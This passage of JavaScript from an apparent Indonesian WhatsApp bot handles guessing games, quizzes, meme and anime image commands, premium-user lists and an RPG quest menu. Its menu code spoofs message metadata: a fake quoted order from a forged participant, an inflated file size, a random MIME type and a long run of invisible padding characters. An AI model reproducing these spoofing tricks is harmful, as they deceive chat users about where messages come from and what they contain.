let sewanya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvipsewa.days} day(s) ${cekvipsewa.hours} hour(s) ${cekvipsewa.minutes} minute(s) ${cekvipsewa.seconds} second(s)`
reply(sewanya)
break
case 'tebak': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
            	if (!m.isGroup) return replyNya(mess.group)
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    let msg = await kirbotz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    kirbotz.sendText(m.chat, `Judul Lagu Nya Apa??\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    kirbotz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    kirbotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    kirbotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    kirbotz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    console.log(result)
                    kirbotz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, kirbotz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
		
                    }
                }
            }
            break
case 'kuismath': case 'math': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
            	if (!m.isGroup) return reply(mess.group)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./Lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix+command} medium`
                let result = await genMath(text.toLowerCase())
                kirbotz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
case 'lirik':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
query = args.join(" ")
nanih = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=${lolkey}&query=${query}`)
replyNya(nanih.result)
break
case 'darkjokes':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
nyenye = fs.readFileSync('./Lib/darkjokes.js');
jsonData = JSON.parse(nyenye);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
let message = await prepareWAMessageMedia({ image: hasil }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Gelap Bos:v`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'meme':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
nyaa = fs.readFileSync('./Lib/meme.js');
                 jsonData = JSON.parse(nyaa);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 memeall = await getBuffer(randKey.result)
let message = await prepareWAMessageMedia({ image: memeall }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Gelap Bos:v`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'hsdxd':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
kntlll = fs.readFileSync('./Lib/highschooldxd.js');
                 jsonData = JSON.parse(kntlll);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 highschooldxd = await getBuffer(randKey.result)
let message = await prepareWAMessageMedia({ image: highschooldxd }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Gelap Bos:v`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'sao':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
kntll = fs.readFileSync('./Lib/swortartonline.js');
                 jsonData = JSON.parse(kntll);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 swordartonline = await getBuffer(randKey.result)
let message = await prepareWAMessageMedia({ image: swordartonline }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Gelap Bos:v`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'lovelive':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
kntl = fs.readFileSync('./Lib/lovelive.js');
                 jsonData = JSON.parse(kntl);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 lovelive = await getBuffer(randKey.result)
let message = await prepareWAMessageMedia({ image: lovelive }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Gelap Bos:v`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'listpremium':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
teks = '*List Premium*\n\n'
for (let kirbotz of prem) {
teks += `- ${kirbotz}\n`
}
teks += `\n*Total : ${prem.length}*`
kirbotz.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'addprem':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
prem.push(bnnd)
fs.writeFileSync('./Database/premium.json', JSON.stringify(prem))
reply(`Nomor ${bnnd} Telah Menjadi Premium!`)
break
case 'delprem':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./Database/premium.json', JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
break
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
kirbotz.sendMessage(m.chat, {audio: inicdd, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'tts':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!q) return replyNya(`Teks Nya???`)
sticWait(from)
inimmk = await fetchJson(`https://api.dapuhy.xyz/api/maker/tts?text=${q}&lang=id&apikey=${dapkey}`)
kirbotz.sendMessage(m.chat, {audio: { url: inimmk.result }, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'scriptbot': case 'sc': case 'script': case 'esce':{
await replyBan(`Chat Owner Di Bawah`)
}
break
case 'creator': case 'owner': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
kirbotz.sendContact(m.chat, owner, m)
}
break
case 'credits':
const sokl = "62881036690566@s.whatsapp.net"
teksits = `「 *Thanks To* 」
♕ Akira @${sokl.split("@")[0]}`
kirbotz.sendMessage(m.chat, { image: ppnyauser, caption: teksits, contextInfo: {
"forwardingScore":999,
"isForwarded":true,
"mentionedJid": [sokl],
"externalAdReply": {
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ',
"sourceUrl": 'https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ'
}}}, { quoted: fakekirbotz })
break
case 'quest':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let sectionnya= [
{
"title": `MISI KE 1`,
 rows: [
{
"title": `Membunuh Slime`,
"description": `Berburu Slime Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}slime`
}
]
}
,
{
"title": `MISI KE 2`,
 rows: [
{
"title": `Membunuh Goblin`,
"description": `Berburu Globin Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}goblin`
}
]
}
,
{
"title": `MISI KE 3`,
 rows: [
{
"title": `Membunuh Devil`,
"description": `Berburu Devil Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}devil`
}
]
}
,
{
"title": `MISI KE 4`,
 rows: [
{
"title": `Membunuh Behemoth`,
"description": `Berburu Behemoth Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}behemoth`
}
]
}
,
{
"title": `MISI KE 5`,
 rows: [
{
"title": `Membunuh Demon`,
"description": `Berburu Demon Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}demon`
}
]
}
,
{
"title": `MISI KE 6`,
 rows: [
{
"title": `Membunuh DemonKing`,
"description": `Berburu DemonKing Untuk Mendapatkan Hadiah`,
"rowId": `${prefix}demonking`
}
]
}
]
kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Rpg Game By KirBotz ", sectionnya, { quoted: fakekirbotz})
break
case 'slime':
case 'killslime':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButslime(from)
break
case 'goblin':
case 'killgoblin':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButgoblin(from)
break
case 'devil':
case 'killdevil':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButdevil(from)
break
case 'behemoth':
case 'killbehemoth':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButbehemoth(from)
break
case 'killdemon':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButdemon(from)
break
case 'demonking':
case 'killdemonking':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!m.isGroup) return replyNya(mess.group) 
if (!isPetualang) return replyNya(mess.noPetualang)
await sendButdemonking(from)
break
case 'groupkirbotz': {
await replyTemplate(`${gckirbotz}\nGak Join Awas Di Ban Kau`)
}
break
case 'menu':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
let timestamp = speed()
let latensi = speed() - timestamp
const botzkir = "62881036690566@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `Hai Kak @${sender.split("@")[0]} 
BloodSword Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
let buttons = [
{buttonId: `${prefix}rpgmenu`, buttonText: {displayText: 'Rpg Menu'}, type: 1},
{buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./Image/memeknya.jpg'), 
fileName: `Bot By BloodSword`, 
mimetype: `application/${bykir}`,
jpegThumbnail: await reSize(ppnyauser, 200, 200),
caption: mbc,
fileLength: "999999999",
mentions:[sender, botzkir],
footer: `_Powered By @${botzkir.split("@")[0]}_`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, botzkir],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": await reSize(ppnyauser, 200, 200),
"previewType": "NONE",
"mediaUrl": 'https://kirbotz-api.herokuapp.com',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'
}}
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`,
				   remoteJid: "6281903153426-1626053991@g.us"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 99999999,
				    status: 1,
				    surface: 1,
				    message: 'Created By BloodSword',
				    orderTitle: '999999999', 
				    sellerJid: `0@s.whatsapp.net` 
				   }
				  }
				 }, detectLink: true })
break
case 'allmenu':{
ngonrona = await fetchJson(`https://api.dapuhy.xyz/api/others/corona?negara=indonesia&apikey=${dapkey}`)
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
var Yy = 0
var ya = '```'
await sendBut5nya(`──────〇『 ${ya}Info User${ya} 』
➥ ${ya}Nama User${ya} : ${pushname}
➥ ${ya}Nomor User${ya} : ${sender.split("@")[0]}
➥ ${ya}User Premium${ya} : ${isPrem ? 'I͎y͎a͎' : 'T͎i͎d͎a͎k͎'}
➥ ${ya}Rank${ya} : ${role}
➥ ${ya}Status${ya} : ${elit}
─〇

──────〇『 ${ya}INFO CORONA${ya} 』
➥ ${ya}Kasus :${ya} ${ngonrona.kasus}
➥ ${ya}Meninggal :${ya} ${ngonrona.meninggal}
➥ ${ya}Sembuh :${ya} ${ngonrona.sembuh}
─〇

──────〇『 ${ya}Tahun Baru${ya} 』
➥ _*${jhari} Hari ${jjam} Jam ${mmmenit} Menit ${ddetik} Detik*_
─〇‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎